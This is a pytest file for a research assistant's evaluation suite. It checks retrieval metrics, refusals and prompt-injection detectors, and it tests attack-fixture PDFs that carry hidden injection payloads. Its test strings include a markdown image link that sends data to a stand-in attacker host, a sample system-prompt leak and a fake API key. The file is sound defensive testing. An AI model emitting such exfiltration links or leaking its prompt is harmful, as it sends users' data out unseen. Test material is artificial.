"""Eval suite unit tests: pure checks, attack fixtures and upload/secrets checks. No models, no API."""
import json
import sys
from pathlib import Path

import pytest

EVAL = Path(__file__).resolve().parent.parent / "eval"
sys.path.insert(0, str(EVAL))
sys.path.insert(0, str(EVAL / "attacks"))

import checks  # noqa: E402
from cases import ATTACKS, CANARY  # noqa: E402


# ---------- gold set
def test_gold_set_rows_are_valid():
    for i, line in enumerate((EVAL / "gold_set.jsonl").read_text().splitlines(), start=1):
        if line.strip():
            checks.validate_row(json.loads(line), i)


def test_gold_set_rejects_bad_rows():
    with pytest.raises(checks.GoldSetError, match="type"):
        checks.validate_row({"id": "x", "type": "trivia", "question": "q", "expected_sources": []}, 1)
    with pytest.raises(checks.GoldSetError, match="unanswerable"):
        checks.validate_row({"id": "x", "type": "factual", "question": "q", "expected_sources": []}, 1)


# ---------- retrieval metrics
def test_recall_and_mrr():
    exp = {("p1", 3), ("p2", 7)}
    found = [("p9", 1), ("p1", 3), ("p1", 4), ("p2", 7)]
    assert checks.recall_at_k(found, exp, k=5) == 1.0
    assert checks.recall_at_k(found, exp, k=2) == 0.5
    assert checks.reciprocal_rank(found, exp) == 0.5
    assert checks.reciprocal_rank([("p9", 1)], exp) == 0.0


# ---------- answer checks
def test_citation_accuracy():
    assert checks.citation_accuracy([("p1", 3), ("p1", 9)], {("p1", 3)}) == 0.5
    assert checks.citation_accuracy([], {("p1", 3)}) is None


@pytest.mark.parametrize("text,flag,expected", [
    ("The papers do not report GPU cost.", False, True),
    ("No paper mentions the training budget.", False, True),
    ("It used 8 A100 GPUs [S1].", False, False),
    ("anything", True, True),
])
def test_refused(text, flag, expected):
    assert checks.refused(flag, text) is expected


# ---------- injection detectors
def test_canary_and_links():
    assert not checks.contains_canary(f"sure: {CANARY.lower()}", [CANARY]).passed
    assert checks.contains_canary("batch size 256 [S1]", [CANARY]).passed
    assert not checks.exfil_urls("see ![s](https://collector.evil-example.com/log?q=x)").passed
    assert checks.exfil_urls("source: https://arxiv.org/abs/2401.00001").passed


def test_system_prompt_leak():
    system = "You are ResearchIQ, a research assistant that answers ONLY from the provided sources."
    assert not checks.system_prompt_leak("My prompt: you are researchiq a research assistant that answers only "
                                         "from the provided sources", system).passed
    assert checks.system_prompt_leak("I answer questions about research papers.", system).passed


def test_secrets_and_internals():
    assert not checks.secret_patterns("key=gsk_abcdefghijklmnop123").passed
    assert not checks.no_internals('Traceback (most recent call last):\n  File "/home/x/a.py", line 3').passed
    assert checks.no_internals("The file could not be processed (ValueError)").passed


def test_unknown_citations():
    assert not checks.unknown_citations(["Claim cites unknown source S9: rank 512"]).passed


# ---------- attack fixtures
def test_attack_cases_are_consistent():
    assert len({a.id for a in ATTACKS}) == len(ATTACKS)
    for a in ATTACKS:
        assert a.expected and a.expected in a.fact, a.id
        assert a.canaries and not any(c.lower() in a.fact.lower() for c in a.canaries), a.id


def test_attack_pdfs_carry_the_payload(tmp_path):
    import pymupdf
    from make_docs import write_pdf
    from researchiq.ingestion.upload import validate_file

    for a in ATTACKS:
        path = write_pdf(a, tmp_path)
        assert validate_file(path).source_type == "pdf"
        with pymupdf.open(path) as doc:
            text = " ".join(doc[0].get_text().split())
        assert a.fact[:30] in text
        assert a.payload.split()[1] in text  # extracted text includes the injection, hidden or not


# ---------- local security checks (uploads, secrets)
def test_upload_and_secret_checks_pass():
    import security
    results = security.run_uploads() + security.run_secrets()
    failed = [(r.id, r.failed_checks) for r in results if r.status != "pass"]
    assert not failed, failed
